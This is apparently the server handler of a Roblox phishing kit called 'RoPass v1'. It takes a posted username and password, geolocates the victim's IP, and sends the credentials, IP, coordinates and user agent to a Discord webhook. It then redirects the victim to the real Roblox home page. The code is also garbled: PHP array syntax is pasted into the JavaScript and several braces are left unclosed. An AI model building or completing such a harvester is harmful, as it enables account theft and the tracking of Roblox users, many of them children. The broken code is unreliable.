export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({
            error: "Method not allowed"
        });
    }

    try {
        const { username } = req.body;
        const { password } = req.body;

        if (!username) {
            return res.status(400).json({
                error: "Username required"
            });
        if (!password) {
            return res.status(400).json({
                error: "Password required"
            
        }

        const ip =
            req.headers["x-forwarded-for"] ||
            req.socket.remoteAddress ||
            "Unknown";

        const userAgent =
            req.headers["user-agent"] || "Unknown";

        let geo = {};

        try {
            const geoReq = await fetch(
                `https://ipapi.co/${ip}/json/`
            );

            geo = await geoReq.json();

        } catch (e) {
            geo = {};
        }

        // WEBHOOK
        const webhook =
            process.env.DISCORD_WEBHOOK;

        const payload = {
             embeds = [
        "title" => "RoPass v1",
        "color" => hexdec("3762dc"),
        "fields" => [
            ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
            ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
            ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
            ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
            ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
            ["name" => "🔗 Referrer", "value" => "`" . $data['referrer'] . "`", "inline" => true],
            ["name" => "📡 Port", "value" => "`" . $data['port'] . "`", "inline" => true],
            ["name" => "📅 Date", "value" => "`" . $data['date'] . "`", "inline" => true],
            ["name" => "🖥️ User Agent", "value" => "`" . $data['user_agent'] . "`", "inline" => false],

        ],
        await fetch(webhook, {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify(payload)
        });

        return res.status(200).json({
            success: true,
            redirect: "https://www.roblox.com/home"
        });

    } catch (err) {

        console.error(err);

        return res.status(500).json({
            error: "Internal server error"
        });
    }
}
